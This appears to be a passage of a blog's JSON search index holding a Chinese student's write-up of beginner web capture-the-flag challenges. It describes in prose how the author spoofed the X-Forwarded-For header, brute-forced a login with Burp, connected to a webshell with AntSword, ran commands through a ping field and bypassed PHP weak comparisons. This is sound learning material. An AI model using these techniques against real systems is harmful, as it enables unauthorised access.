gatchar()和%c的scanf()可以接受所有的字符 8.7 菜单浏览 switch语句 解决缓冲输入带来的麻烦，跳过多余输入和换行符 1 2 while(getchar()!=\u0026#39;\\n\u0026#39;) continue; ","date":"2019-11-06T02:36:00Z","permalink":"https://dorinxl.github.io/p/c-prime-plus%E7%AC%AC%E5%85%AB%E8%8A%82%E7%AC%94%E8%AE%B0/","title":"《C Prime Plus》第八节笔记"},{"content":" 学校信安协会第一次培训结束后的作业，要求把攻防世界的web新手区题目做一遍并写题解。\n第一题 view_source 查看源代码右键不能用，但是F12能用，于是找到源代码\n输入到flag框即可\n后来在网上看到可以在url前面插入view-source:来查看网页源代码\n第二题 get_post 题目描述点明了该题要用到关于http的两种请求方式，那么就要学习一下http的几种请求方式。\n查阅各种博客之后，发现get的请求方式直接在url框内输入就好，而post的请求方式需要用其他方式写入参数，有点高深。\n找到了火狐的harkbar工具包插件，学习了一下参数注入，成功过关。\n第三题 robots 看到了新名词，自然要去学习这个什么robots协议，查阅资料后发现就是爬虫协议，也叫机器人协议蜘蛛协议什么的。\n从博客学习：robots协议文件的写法及语法属性解释\n1 2 robots.txt文件是一个文本文件，是放置在网站根目录下，使用任何一个常见的文本编辑器，就可以创建和编辑它。 robots.txt是搜索引擎中访问网站的时候要查看的第一个文件，其主要的作用就是告诉蜘蛛程序在服务器上什么文件是可以被查看的。 在后面加上robots.txt\n出现个.php的disallow，把它放到url后面：\n输入flag，下一题。\n第四题 backup 涉及到备份的问题了，继续学习。发现备份的后缀是.bak，backup的缩写。\n在url框输入index.php.bak 得到flag\n第五题 cookie f12找cookie，找到一个php\n进入php，发现需要查看http response，费老大劲找响应头：\n第六题 disable_button 打开链接发现一个不能按的按钮框，老办法，f12\n把disabled的内容删去，把按钮变为可按状态。\n按下按钮之后，得到flag\n第七题 看到js的样式，直觉到与javascript有关。打开网页发现要输密码，啥也没想点了个确认发现换了网页，查看原代码之后发现了这个\n``` dechiffre(\u0026quot;\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30\u0026quot;) ``` \\x在c语言中是十六进制，于是转换成十进制，再用acsii码对比一下。\n第八题 xff_referer 得，没见过的东西，再去继续学习。\nX-Forwarded-For:简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项。\nHTTP Referer：header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的。\n要伪造ip地址，网上查阅一下火狐浏览器可以用插件，装上之后伪造ip。\n学习一下burp的基本操作：\n看到一个google\n第九题 weak auth 上来就让输入信息：\n学习一下burp的爆破操作，网上找些字典，把用户名跟密码输入：\n第十题 webshell 为了连接webshell专门搞个antsword\n说实话我一开始不知道这个连接密码是啥，上网查了查：\n进去之后找到了flag.txt:\n第十一题 command execution ping？再次上网找资料，发现这个题要考windows命令操作，对照着手册缓缓地输入了127.0.0.1来进入本地，ls访问目录，然后再找flag.txt,最后把flag找出来。操作手册看得头懵。\n第十二题 simple_php 既然是php写的代码，就要看看代码的意思了。\n在不停的查询之后，了解到，第一个if，因为只用了两个等号，那么判定为弱比较，只要开头是0就行，而且后面不能全部为数字，那就带几个字母。 第二个if要知道这个函数判断b是否为数字。 第三个if，b是一个大于1234的数，后面还要加上一些字母。 保存一下学php的教程，然后缓缓地在url框输入点东西：\n终于搞完了flag\n有一说一，要想做题，真的要学好多东西，各种各样的知识。学会好好利用网络资源很重要。 一瘸一拐的在网络知识的帮助下终于懵懵懂懂的搞完了这几个题。\n","date":"2019-11-05T14:08:00Z","permalink":"https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/","title":"攻防世界web新手区做题记录"}]